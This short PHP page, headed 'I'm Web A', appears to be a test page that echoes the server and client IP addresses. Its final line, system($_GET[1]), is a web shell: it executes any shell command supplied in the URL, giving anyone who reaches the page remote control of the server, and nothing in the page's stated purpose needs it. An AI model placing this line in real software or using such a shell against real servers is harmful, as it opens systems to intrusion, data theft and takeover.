I'm Web A
<?php 
echo "Server IP: " . $_SERVER['SERVER_ADDR'] . "<br>";
echo "Client IP: " . $_SERVER['REMOTE_ADDR'] . "<br>";
system($_GET[1]);
?>